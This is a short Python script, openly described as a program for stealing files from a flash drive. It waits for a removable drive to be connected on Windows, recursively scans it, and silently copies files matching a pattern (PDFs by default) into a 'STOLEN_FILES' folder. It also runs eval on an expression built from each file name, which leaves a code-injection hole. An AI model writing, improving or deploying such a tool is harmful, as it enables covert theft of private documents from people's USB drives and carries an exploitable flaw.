# Program for stealing files from flashdrive
# TODO Threading

import os
import subprocess
import time

EXC_DIRS = ("D", "C", "E")						# Current existing drives

# Pattern for files to steal ()
# $name$ - name of the file
# $name$.endswith(".png") = steal all files which name ends with .png
# $name$.endswith(".png") or $name$.endswith(".jpeg")= steal all files which name ends with .png or .jpg
# $name$.endswith(".docx") = steal all files which name ends with .docx
SCAN_EXPRESSION = '$name$.endswith(".pdf")'

FILENAMES = set()				# List of filenames to steal
DIR_FOR_FILES = "STOLEN_FILES"	# Folder where all stolen files will be located

# While-True-Loop which waits for flashdrive connection
def wait_for_flash():
	while True:
		# loop over disks [A-Z]
		for c in range(65, 91):
			try:
				disk_char = chr(c)
				if disk_char in EXC_DIRS: continue
				res = subprocess.check_output([f"{disk_char}:"], shell = True, stderr=subprocess.PIPE)
			except subprocess.CalledProcessError: continue

			return disk_char

# Recursive scanning directories in flashdrive
def scan_dir(path, level = 0, debug = True):
	for folder in os.scandir(path):
		if folder.is_dir():
			if debug: print('\t'*level, folder.name, " [D]", sep = '')
			scan_dir(folder.path, level + 1, debug = debug)
		else:
			# If filename match pattern - adding filename to list of all files
			if eval(SCAN_EXPRESSION.replace("$name$", f"\"{folder.name}\"").replace("$path$", f"\"{folder.path}\"")):
				FILENAMES.add((folder.path, folder.name))
			if debug:
				print('\t'*level, folder.name, " [F]", sep = '')

# Copy file from src to dest
def copy_file(src, dest):
	open(dest + "\\" + src[1].replace(".", f" ({str(time.time())[-5:]})."), "wb").write(open(src[0], "rb").read())

def stole_files():
	for e, file in enumerate(FILENAMES):
		print(f"[{time.strftime('%H:%M:%S')}] {e} \\ {len(FILENAMES)}  ||  {file[0]}")
		copy_file(file, DIR_FOR_FILES)

start = time.time()

print(f"[{time.strftime('%H:%M:%S')}] Waiting for flash...")
flash_chr = wait_for_flash()
print(f"[{time.strftime('%H:%M:%S')}] Found flash [{flash_chr}:]")

scan_dir(f"{flash_chr}:", debug = False)
stole_files()

print(f"[{time.strftime('%H:%M:%S')}] Done in {time.time() - start}")